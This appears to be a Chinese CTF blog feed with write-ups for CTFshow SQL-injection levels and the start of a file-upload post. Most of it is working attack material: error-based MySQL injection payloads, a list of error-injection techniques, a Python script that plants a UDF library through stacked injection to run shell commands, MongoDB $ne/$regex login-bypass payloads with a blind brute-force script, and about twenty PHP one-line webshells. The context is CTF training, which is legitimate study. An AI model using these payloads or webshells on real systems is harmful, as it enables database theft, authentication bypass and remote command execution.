updatexml(1,concat(0x7e,database(),0x7e),1)+--+  # 0x7e --&gt; ~?id&#x3D;1&#39; or updatexml(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,32),0x7e),1)+--+?id&#x3D;1&#39; or updatexml(1,concat(0x7e,(select left(flag,32) from ctfshow_flag),0x7e),1)+--+?id&#x3D;1&#39; or updatexml(1,concat(0x7e,(select right(flag,32) from ctfshow_flag),0x7e),1)+--+</code></pre><p>看到了好东西</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1. floor + rand + group byselect * from user where id&#x3D;1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);select * from user where id&#x3D;1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));2. ExtractValueselect * from user where id&#x3D;1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));3. UpdateXmlselect * from user where id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1));4. Name_Const(&gt;5.0.12)select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;5. Joinselect * from(select * from mysql.user a join mysql.user b)c;select * from(select * from mysql.user a join mysql.user b using(Host))c;select * from(select * from mysql.user a join mysql.user b using(Host,User))c;6. exp()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and Exp(~(select * from (select version())a));7. geometrycollection()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));8. multipoint()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));9. polygon()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));10. multipolygon()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));11. linestring()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));12. multilinestring()&#x2F;&#x2F;mysql5.7貌似不能用select * from user where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</code></pre><h4 id="web245-extractvalue"><a href="#web245-extractvalue" class="headerlink" title="web245(extractvalue)"></a>web245(extractvalue)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;无过滤过滤updatexml</code></pre><p>这里使用extractvalue</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名 ctfshow_flagsa?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))+--+# 查列名 flag1?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39;),0x7e))+--+# getFlag?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),5,15),0x7e))+--+?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),20,30),0x7e))+--+</code></pre><h4 id="web246-floor"><a href="#web246-floor" class="headerlink" title="web246(floor)"></a>web246(floor)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//无过滤</span>过滤updatexml extractvalue</code></pre><p>这里使用floor + rand + group by 主要利用主键的重复来实现报错</p><p><a href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名 ctfshow_flags?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a);--+# 查列名 flag2?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flags&#39; limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23# getFlag?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select flag21 from ctfshow_flags1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</code></pre><h4 id="web247-双查询错误注入、报错注入"><a href="#web247-双查询错误注入、报错注入" class="headerlink" title="web247(双查询错误注入、报错注入)"></a>web247(双查询错误注入、报错注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//无过滤</span>过滤updatexml extractvalue floor</code></pre><p><code>floor()：向下取整</code><br><code>ceil()：向上取整</code><br><code>round()：四舍五入</code></p><p>floor替换成其他取整函数即可</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 查表名 ctfshow_flagsa1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23# 查列名 flag?1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39; limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23# getFlag1&#39; and (select 1 from (select count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23</code></pre><h4 id="web248-udf注入"><a href="#web248-udf注入" class="headerlink" title="web248(udf注入)"></a>web248(udf注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></code></pre><p>mysql的UAF注入,简单来说就是把dll文件写到目标机子的plugin目录，这个目录是可以通过select @@plugin_dir来得到的。此外就是这题可以堆叠注入，我一开始没想到可以堆叠，以为是布尔，其实还是没理解这个UAF注入，最后的导入函数这里：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?id&#x3D;1&#39;; select @@plugin_dir; -- -查出Mysql插件路径：&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#x2F;api&#x2F;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+引入udf.so文件从而创建函数sys_eval</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;; &#x2F;&#x2F;导入udf函数</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsbase_url <span class="token operator">=</span> <span class="token string">"https://49e6bca5-e443-47a8-9a15-8619fb62730f.challenge.ctf.show/api/"</span>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">]</span>udf <span class="token operator">=</span> <span class="token stringspan><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">21510</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    end <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">5000</span>    payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> t <span class="token keyword">in</span> text<span class="token punctuation">:</span>    url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select unhex('&#123;&#125;') into dumpfile '/usr/lib/mariadb/plugin/&#123;&#125;.txt'--+&amp;page=1&amp;limit=10"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        p<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>  <span class="token comment"># UDF提权一般配合dumpfile 而不是outfile</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>next_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'),load_file('/usr/lib/mariadb/plugin/e.txt')) into dumpfile '/usr/lib/mariadb/plugin/udf.so'-- +&amp;page=1&amp;limit=10"</span>  <span class="token comment"># 将各个txt文件合并到udf.so</span>rn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>next_url<span class="token punctuation">)</span>uaf_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';--+"</span>  <span class="token comment"># 创建udf函数</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uaf_url<span class="token punctuation">)</span>nn_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select sys_eval('cat /flag.*');-- +&amp;page=1&amp;limit=10"</span>  <span class="token comment"># 执行命令并查看</span>rnn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>nn_url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rnn<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web249-nosql"><a href="#web249-nosql" class="headerlink" title="web249(nosql)"></a>web249(nosql)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$memcache</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><a href="https://www.anquanke.com/post/id/97211">冷门知识 — NoSQL注入知多少</a></p><p><a href="http://rui0.cn/archives/609">NoSQL注入小笔记</a></p><p><strong>Memcached get</strong> 命令获取存储在 <strong>key(键)</strong> 中的 <strong>value(数据值)</strong> ，如果 key 不存在，则返回空。</p><p>补充一下知识：</p><pre class="language-sql" data-language="sql"><code class="language-sql">$gt : <span class="token operator">></span>$lt : <span class="token operator">&lt;</span>$gte: <span class="token operator">>=</span>$lte: <span class="token operator">&lt;=</span>$ne : <span class="token operator">!=</span>、<span class="token operator">&lt;></span>$<span class="token operator">in</span> : <span class="token operator">in</span>$nin: <span class="token operator">not</span> <span class="token operator">in</span>$<span class="token keyword">all</span>: <span class="token keyword">all</span> $<span class="token operator">or</span>:<span class="token operator">or</span>$<span class="token operator">not</span>: 反匹配<span class="token punctuation">(</span><span class="token number">1.3</span><span class="token number">.3</span>及以上版本<span class="token punctuation">)</span>模糊查询用正则式：db<span class="token punctuation">.</span>customer<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">'name'</span>: &#123;<span class="token string">'$regex'</span>:<span class="token string">'.*s.*'</span>&#125; &#125;<span class="token punctuation">)</span><span class="token comment">/*** : 范围查询 &#123; "age" : &#123; "$gte" : 2 , "$lte" : 21&#125;&#125;* : $ne &#123; "age" : &#123; "$ne" : 23&#125;&#125;* : $lt &#123; "age" : &#123; "$lt" : 23&#125;&#125;*/</span><span class="token comment">//查询age = 22的记录</span>db<span class="token punctuation">.</span>userInfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">"age"</span>: <span class="token number">22</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//相当于：select * from userInfo where age = 22;</span><span class="token comment">//查询age > 22的记录</span>db<span class="token punctuation">.</span>userInfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;age: &#123;$gt: <span class="token number">22</span>&#125;&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//相当于：select * from userInfo where age > 22;</span></code></pre><p><code>id=flag</code> 不行，id 都是数字，尝试数组绕过得到 flag <code>id[]=flag</code></p><h4 id="web250-MongoDB"><a href="#web250-MongoDB" class="headerlink" title="web250(MongoDB)"></a>web250(MongoDB)</h4><p>sql语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow.ctfshow_user'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//无过滤</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>  <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>MongoDB是NOSQL的一种，介绍一下Mongodb得两个操作符：<br><code>$ne</code>：!&#x3D; 不等于<br><code>$regex</code>：正则匹配</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>username<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">.</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">.</span></code></pre><p>如果输入<code>value[$ne]=1</code>也就意味着<code>value=array($ne=&gt;1)</code>，在MongoDB中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用<code>username[$gt]=&amp;password[$gt]=</code>作为payload进行攻击。</p><h4 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h4><p>同上</p><h4 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//sql</span>db<span class="token punctuation">.</span>ctfshow_user<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;username:<span class="token string">'$username'</span><span class="token punctuation">,</span>password:<span class="token string">'$password'</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">.</span>pretty<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>同时不能是 admin和 admin1，正则绕过<br>payload: <code>username[$regex]=^[^admin].*&amp;password[$ne]=1</code></p><h4 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h4><p>username&#x3D;flag时返回登陆成功，但没有密码，考虑盲注爆出密码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://2eb32fc2-5457-44b4-b948-b0c416a768c8.challenge.ctf.show/api/'</span>flag <span class="token operator">=</span> <span class="token string">''</span>flag_dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;&#125;1234567890-poiuytrrewqasdfghjklmnbvcxz"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_dic<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username[$regex]"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>            <span class="token string">"password[$regex]"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"登陆成功"</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag<span class="token operator">+</span>i            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-upload</title>
      <link href="/2024/07/02/web%E5%85%A5%E9%97%A8-upload/"/>
      <url>/2024/07/02/web%E5%85%A5%E9%97%A8-upload/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><a href="https://blog.csdn.net/qq_43390703/article/details/104858705">文件上传漏洞 (上传知识点、题型总结大全-upload靶场全解)</a></p><h4 id="产生文件上传漏洞的原因"><a href="#产生文件上传漏洞的原因" class="headerlink" title="产生文件上传漏洞的原因"></a>产生文件上传漏洞的原因</h4><p><strong>原因：</strong></p><ul><li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li><li>对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查</li><li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）</li><li>对于web server对于上传文件或者指定目录的行为没有做限制</li></ul><p><strong>原理：</strong><br>在 WEB 中进行文件上传的原理是通过将表单设为 multipart&#x2F;form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p><p>文件上传后导致的常见安全问题一般有:</p><ul><li><p>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代<br>码执行;</p></li><li><p>上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其<br>他通过类似方式控制策略文件的情况类似);</p></li><li><p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</p></li><li><p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br>行，被用于钓鱼和欺诈。</p></li><li><p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)”执行此脚本;等等。此类问题不在此细述。</p></li></ul><h4 id="常用的一句话木马"><a href="#常用的一句话木马" class="headerlink" title="常用的一句话木马"></a>常用的一句话木马</h4><pre class="language-php" data-language="php"><code class="language-php">##PHP：<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r00ts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); </span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo();</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//print_r($new_array);</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span>@<span class="token function">call_user_func</span><span class="token punctuation">(</span>assert<span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'asse'</span><span class="token operator">.</span><span class="token string single-quoted-string">'rt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> php环境>=&lt;5.6才能用<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  php环境>=5.6才能用<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token variable">$_GET1</span><span class="token punctuation">)</span><span class="token operator">.</span>@<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>//容错代码 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span 